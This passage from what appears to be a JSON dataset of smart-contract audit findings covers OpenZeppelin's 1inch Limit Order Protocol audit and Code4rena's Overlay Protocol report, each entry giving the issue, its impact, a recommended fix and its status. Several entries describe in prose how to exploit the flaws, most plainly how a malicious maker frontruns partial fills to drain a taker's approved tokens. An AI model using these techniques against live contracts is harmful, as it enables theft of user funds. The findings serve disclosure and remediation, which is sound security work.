      "summary": "\nThe LimitOrderProtocol contract is a contract used to enable the usage of Chainlink oracles during predicates check and the lookup of maker and taker amounts. This contract makes implicit assumptions about the number of decimals that the Chainlink oracles should report in, as well as the number of decimals that the function parameters should contain. If the assumptions are not met, it can lead to unexpected behaviors such as mis-pricing of assets and unintentional loss of funds.\n\nThe ChainlinkCalculator contract, which is inherited by the LimitOrderProtocol contract through the OrderMixin contract, exposes two functions to enable the usage of Chainlink oracles. The contract assumes that the Chainlink oracles will report with 18 decimals of precision while not all Chainlink oracles report with the same number of decimals. The contract also assumes that the `amount` parameter for the `ChainlinkCalculator` functions will use 18 decimals.\n\nIn order to fix this issue, it is recommended to explicitly document assumptions regarding the number of decimals that parameters and return values should be in terms of. It is also suggested to consider either limiting calculations that depend on oracles that break those assumptions, or having the relevant calculations take the actual number of decimals into account. This issue has been fixed in pull request #75.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10682",
      "title": "[M02] ERC721 orders can be manipulated",
      "impact": "MEDIUM",
      "content": "It is possible to exchange more than just ERC20s via the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) by deploying a contract that shares the same function selector as IERC20’s `transferFrom`, and providing that contract as the [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L279) or the [`takerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L259) in an order.\n\n\nThe out-of-scope proxies, namely, [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol), [`ERC721ProxySafe`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721ProxySafe.sol), and [`ERC1155Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol) contracts follow this pattern to provide support for `ERC721` and `ERC1155` tokens. Since the proxies must be called with the same pattern as an IERC20 `transferFrom` call, the signature must start with `address from`, `address to` and `uint256 amount`. Anything else that the proxies require can be passed in after, and is defined in the order as [`makerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L279) and [`takerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L259).\n\n\nERC1155s can naturally transfer multiple of the same id tokens at once, which means the [`ERC1155Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol) contract makes use of the `amount` field. On the other hand, `ERC721`s do not have an obvious use for the `amount` field. Since they represent non-fungible tokens, a specific tokenId will only have one in existence, rendering the `amount` field useless. Because of this, the implementation for both [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) and [`ERC721ProxySafe`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721ProxySafe.sol) contracts use the required `amount` field as the `tokenId` instead.\n\n\nThis overloading of the `amount` parameter creates the possibility of partially filling `ERC721` orders in order to purchase separately listed tokens at discounted prices. For instance, there could be a case where a single user has multiple `ERC721`s of the same contract permitted to be transferred by the [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) contract and lists them in separate limit orders.  \n\nIf the limit orders also provide the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L316) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L327) fields, it will be possible to partially fill these `ERC721` orders. Since the order’s [`amount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278) field actually corresponds to the [`tokenId`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol#L22), a malicious user can place a partial fill on the `ERC721` with the higher tokenId, resulting in a [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278)/[`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L258) of an `ERC721` that could correspond to a lower `tokenId`. The result is the `ERC721` with the lower `tokenId` would be transferred at the price of `(higher tokenId price) * (lower tokenId's id) / (higher tokenId's id)`.\n\n\nThis exploit has a few requirements:\n\n\n* Multiple `ERC721`s from the same contract to be allowed on either `ERC721` proxy by a single owner.\n* Open order for one of the `ERC721`s that is not the lowest `tokenId` of the ones allowed.\n* Partial fills allowed on the order.\n\n\nTo completely remove the possibility of partial `ERC721` fills, consider separating the `amount` and `tokenId` arguments. Whether the arguments are separated or not, consider also documenting this to alert users of this behavior and to avoid this pattern in the future.\n\n\n***Update:** Fixed in [pull request #59](https://github.com/1inch/limit-order-protocol/pull/59).*",
      "summary": "\nThe OrderMixin contract allows users to exchange more than just ERC20s. Out-of-scope proxies such as the ERC721Proxy, ERC721ProxySafe, and ERC1155Proxy contracts are used to provide support for ERC721 and ERC1155 tokens. These proxies must be called with the same pattern as an IERC20 transferFrom call, and the signature must start with address from, address to, and uint256 amount. Anything else that the proxies require can be passed in after, and is defined in the order as makerAssetData and takerAssetData. \n\nThe ERC1155Proxy contract makes use of the amount field, while the ERC721Proxy and ERC721ProxySafe contracts use the required amount field as the tokenId instead. This creates the possibility of partially filling ERC721 orders in order to purchase separately listed tokens at discounted prices. \n\nTo avoid this exploit, consider separating the amount and tokenId arguments and document this to alert users of this behavior. This issue was fixed in pull request #59.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10681",
      "title": "[M01] Static arguments passed after dynamic arguments",
      "impact": "MEDIUM",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) bytes fields are used as arguments for the [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) and [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) functions. These calls provide a way to calculate one side of the swap based on the other side, and they allow users to partially fill orders.\n\n\nThe [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68)/[`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields are dynamic variables and are packed in front of the [`takerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`makerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) values in the [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) and [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) functions. It is possible for a malicious maker to provide more data than expected in the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and  \n\n[`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields to push the [`takerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`makerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) bytes past where they are assumed to be when being decoded in the next function. This allows the maker to shift the passed in taker or maker amount by a full bytes to the right and even replace them completely if an extra 32 bytes of data is provided.\n\n\nUsers already have to manually review the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields in the order, but this technique is rather hard to spot. Also worth noting, this attack even applies to the internally trusted [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions. For most attacks, providing a reasonable threshold amount will prevent loss of funds.\n\n\nTo prevent this, consider encoding the static arguments before the dynamic arguments to avoid giving the dynamic arguments a method to control the static arguments.\n\n\n***Update:** Not fixed. The 1inch team stated:*\n\n\n\n> We’ll take extra care with getters validation. We’ll try to implement sanity validation of getters in our sdk that will help with filtering potentially malicious orders.\n> \n>",
      "summary": "\nThis bug report is about the OrderMixin contract, which is used to calculate swap amounts for users to partially fill orders. It is possible for a malicious maker to provide more data than expected in the getTakerAmount and getMakerAmount fields, which can push the takerAmount and makerAmount bytes past where they are assumed to be when being decoded. This can cause a loss of funds if the maker provides an extra 32 bytes of data, and it is difficult to spot. \n\nTo prevent this, the 1inch team is taking extra care with getters validation and implementing sanity validation of getters in their SDK to help filter out potentially malicious orders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10680",
      "title": "[H03] Malicious maker could take advantage of partial fills to steal taker’s assets",
      "impact": "HIGH",
      "content": "Orders from the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract have the ability to be partially filled. To support partial fills, the protocol requires a way to calculate both sides of swaps. Both [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) fields are defined by the maker of the order for this exact purpose.\n\n\nWhen filling an order, takers must provide either the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L193) or the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L194) values as well as a [`thresholdAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L195) value. There are two different code-paths that can be taken, based on if the `makingAmount` or the `takingAmount` was provided.\n\n\nThe first one is when the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L225) parameter is defined. It could [truncate](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L227) the `makingAmount` value and also [calculate the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L229) value for it. In this situation, the `thresholdAmount` ensures that the `takingAmount` value taken is [not unexpectedly large](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L230).\n\n\nThe second one is when the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232) parameter is defined. In such case, it will [calculate the `makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) value, with the possibility of [truncating it](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L235) and [recalculating the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value if that happens. In this situation, the `thresholdAmount` value ensures that the `makingAmount` value returned is [not unexpectedly small](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L238).\n\n\nThere exist two exploitation methods, each unique to one of the previous mentioned code-paths. These exploitation methods require malicious [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) functions. A simple implementation of these functions would have an identical behavior to [`AmountCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol)‘s [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions, but with a hard-coded switch that will force them to return an attacker controlled value when needed.\n\n\nThe first, less severe exploit pattern involves the first code-path where the [`makingAmount` value is specified](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L225) in a fill order. A malicious maker would wait for a fill order which specifies `makingAmount` to show up in the mempool in order to frontrun it. They would drain all of the value except 1 from the maker’s side and then force [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) to return the amount specified in the user’s [`thresholdAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L230) value (or their allowance if it is less). When the user’s transaction finally goes through, they will swap their full [`thresholdAmount` worth of `takerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L258) for a single unit of [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278). This exploit is limited by the amount given by the `thresholdAmount` value or the amount of the `takerAsset` the user allowed on the `LimitOrderProtocol` contract.\n\n\nThe second, more severe exploit pattern involves the second code-path where the [`takingAmount` value is specified](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232). The malicious maker would similarly wait for a fill order that specified a `takingAmount` value to show up in the mempool. They would frontrun the transaction and force the [`makingAmount` value returned by `_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) function to be higher than both the `remainingMakerAmount` and the `thresholdAmount`. They would also set the [`takingAmount` returned value by `_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) to be the amount of `takerAsset` asset allowed on the `LimitOrderProtocol` by the taker. When the taker’s transaction goes through, it will [truncate the `makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L235) value and then [recalculate the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value. This recalculation is not guaranteed to be lower however, and in this case will drain the taker of all the `takerAsset` that they allowed on the contract. In this code-path, the `thresholdAmount` value is [ensuring that the `makingAmount` is not too low](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L238), so taking all the taker’s `takerAsset` asset is unchecked. The funds lost are bounded by the amount of the `takerAsset` asset the user allowed on the `LimitOrderProtocol` contract.\n\n\nThese exploits are not possible without partial orders and, more specifically, partial orders with malicious `getMakerAmount` and `getTakerAmount` implementations.\n\n\nThe main issue of the `thresholdAmount` value check is that it only covers one side of the swap, but the other side can be manipulated via frontrunning. There are no assurances that the value the taker originally proposed remains unchanged. Consider removing `makingAmount` truncation from both code-paths and reverting if the order cannot support a fill as large as requested. By doing this, the `thresholdAmount` can be used to sufficiently restrict the other side of the swap and avoid unexpected behavior, even in malicious orders.\n\n\n***Update:** Fixed in [pull request #83](https://github.com/1inch/limit-order-protocol/pull/83).*",
      "summary": "\nThe bug report describes two exploitation methods related to partial fills of orders from the OrderMixin contract. The first exploit pattern involves the code-path where the makingAmount is specified in a fill order. A malicious maker would wait for a fill order and frontrun it, draining all of the value except 1 from the maker’s side and then forcing the _callGetTakerAmount to return the amount specified in the user’s thresholdAmount value. The second exploit pattern involves the code-path where the takingAmount is specified. A malicious maker would similarly wait for a fill order and frontrun it, setting the takingAmount returned by _callGetTakerAmount to be the amount of takerAsset allowed on the LimitOrderProtocol by the taker. In both cases, the funds lost are bounded by the amount of the takerAsset the user allowed on the LimitOrderProtocol contract.\n\nThe main issue of the thresholdAmount value check is that it only covers one side of the swap, but the other side can be manipulated via frontrunning. To fix this, the makingAmount truncation from both code-paths was removed and the order was reverted if it couldn't support a fill as large as requested. This allowed the thresholdAmount to sufficiently restrict the other side of the swap and avoid unexpected behavior, even in malicious orders. The bug was fixed in pull request #83.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10679",
      "title": "[H02] Partially-filled private orders can be filled by anyone",
      "impact": "HIGH",
      "content": "The protocol allows the creation of private and public orders. On private orders, only the [`allowedSender`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L62) address, specified by the maker during the order’s creation, is able to fill the order.\n\n\nHowever, in the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, [validation for the `allowedSender` address](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L204) is incorrectly scoped, meaning that it is only evaluated inside the logic that handles the first fill of an order. If a private order is partially filled, then the check for the `allowedSender` address is no longer reachable and the order becomes fillable by anyone.\n\n\nTo clarify intent around whether any user should be able to fill partially-filled private orders or not, consider either documenting the reason for the current behavior or validating the `allowedSender` address outside of the scope of the first fill to ensure that it will be validated every time a fill is attempted.\n\n\n***Update:** Fixed in [pull request #58](https://github.com/1inch/limit-order-protocol/pull/58).*",
      "summary": "\nThis bug report is about the Limit Order Protocol, which allows users to create private and public orders. Private orders are only fillable by the address specified by the maker during the order’s creation, known as the `allowedSender` address. However, the validation for the `allowedSender` address in the OrderMixin contract was incorrectly scoped, meaning that it was only evaluated when the order was first filled. This meant that after a private order was partially filled, it could be filled by anyone, which was not the intended behavior. \n\nTo fix this bug, the `allowedSender` address needs to be validated outside of the scope of the first fill, so that it is evaluated every time a fill is attempted. This bug has now been fixed in pull request #58.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10678",
      "title": "[H01] Inconsistent data passed into _makeCall",
      "impact": "HIGH",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`_makeCall`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L308) function is used to transfer assets [from the taker to the maker](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L252) and then [from the maker to the taker](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L272). In the latter transfer, the `_makeCall` function is incorrectly passed the order’s [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L58) as the last parameter, when it should be the order’s [`makerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L65).\n\n\nAs a result, any proxy functionality that relies on the `makerAssetData` argument will break.\n\n\nTo be consistent with the earlier call to `_makeCall` and to fully support proxy functionality, consider updating the `order.makerAsset` parameter to `order.makerAssetData`.\n\n\n***Update:** Fixed in [pull request #57](https://github.com/1inch/limit-order-protocol/pull/57).*",
      "summary": "\nA bug was found in the OrderMixin contract which affects the _makeCall function. This function is used to transfer assets from the taker to the maker and then from the maker to the taker. In the latter transfer, the _makeCall function was incorrectly passed the order’s makerAsset as the last parameter, when it should be the order’s makerAssetData. As a result, any proxy functionality that relies on the makerAssetData argument will break. To fix the bug, the parameter should be updated to order.makerAssetData. The bug has since been fixed in pull request #57.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42323",
      "title": "[M-04] _totalSupply not updated in _transferMint() and _transferBurn()",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon, also found by WatchPug, harleythedog, hubble, xYrYuYx, cmichel, and defsec_\n\n#### Impact\n\nThe functions `\\_transferMint()` and `\\_transferBurn()` of OverlayToken.sol don't update `\\_totalSupply`.\nWhereas the similar functions `\\_mint()` and `\\_burn()` do update `\\_totalSupply`.\n\nThis means that `\\_totalSupply` and `totalSupply()` will not show a realistic view of the total OVL tokens.\n\nFor the protocol itself it isn't such a problem because this value isn't used in the protocol (as far as I can see).\nBut other protocols building on Overlay may use it, as well as user interfaces and analytic platforms.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L349-L364>\n\n```js\nfunction _mint( address account, uint256 amount) internal virtual {\n   ...\n      _totalSupply += amount;\n```\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L376-L395\n\n```js\nfunction _burn(address account, uint256 amount) internal virtual {\n   ...\n        _totalSupply -= amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L194-L212\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L268-L286\n```\n\n## Recommended Mitigation Steps\nUpdate `_totalSupply`  in `_transferMint()` and `_transferBurn()`\n\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/59#issuecomment-988286320):**\n > We're not sure if this is a 1 or a 2. Definitely, at least a one - this is an incorrect implementation of the spec. \n> \n> But is it a two? It wouldn't lose funds with our contracts, we make no use of the total supply of OVL in our accounting.\n> \n> This might prove to be a vulnerability if another protocol, like Ribbon, used us for a vault of theirs, made use of total supply, and failed to discern this problem.\n> \n> \n> \n> \n\n\n\n",
      "summary": "\nThis bug report is about a problem with the functions `_transferMint()` and `_transferBurn()` in the OverlayToken.sol contract. These functions do not update the `_totalSupply` value, unlike the similar functions `_mint()` and `_burn()`. This means that the total supply of OVL tokens will not be accurately reflected. While this may not affect the protocol itself, it could cause issues for other protocols and user interfaces that rely on this value. The recommended mitigation step is to update `_totalSupply` in the affected functions. It is not clear if this bug is a major issue, but it could potentially cause problems for other protocols that use OverlayToken.sol. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "42322",
      "title": "[M-03] Can't enableCollateral after a disableCollateral",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nThe function `disableCollateral` of OverlayV1Mothership.sol doesn't set `collateralActive\\[\\_collateral] = false;`\nBut it does revoke the roles.\n\nNow `enableCollateral`  can never be used because `collateralActive\\[\\_collateral] ==true`  and it will never pass the second require.\nSo you can never grant the roles again.\n\nNote: `enableCollateral` also doesn't set `collateralActive\\[\\_collateral] = true`\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/mothership/OverlayV1Mothership.sol#L133-L153>\n\n```JS\nfunction enableCollateral (address _collateral) external onlyGovernor {\n    require(collateralExists[_collateral], \"OVLV1:!exists\");\n    require(!collateralActive[_collateral], \"OVLV1:!disabled\");\n    OverlayToken(ovl).grantRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n    OverlayToken(ovl).grantRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n}\n\nfunction disableCollateral (address _collateral) external onlyGovernor {\n    require(collateralActive[_collateral], \"OVLV1:!enabled\");\n    OverlayToken(ovl).revokeRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n    OverlayToken(ovl).revokeRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n}\n```\n\n#### Recommended Mitigation Steps\n\nIn function `enableCollateral()` add the following (after the require):\n`collateralActive\\[\\_collateral] = true;`\n\nIn function `disableCollateral` add the following (after the require):\n`collateralActive\\[\\_collateral] = false;`\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/55)** \n\n",
      "summary": "\nThe function `disableCollateral` in the code for OverlayV1Mothership.sol is not working properly. It does not set `collateralActive[_collateral]` to false, but it does revoke certain roles. This means that the function `enableCollateral` cannot be used because `collateralActive[_collateral]` will always be true and the second requirement will never be met. This also means that the roles cannot be granted again. To fix this, the code needs to be updated in both the `enableCollateral` and `disableCollateral` functions to properly set `collateralActive[_collateral]` to true and false, respectively. This issue has been confirmed by another user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/55",
      "tags": [],
      "finders": []
    },
    {
      "id": "42321",
      "title": "[H-01] `OverlayV1UniswapV3Market` computes wrong market liquidity",
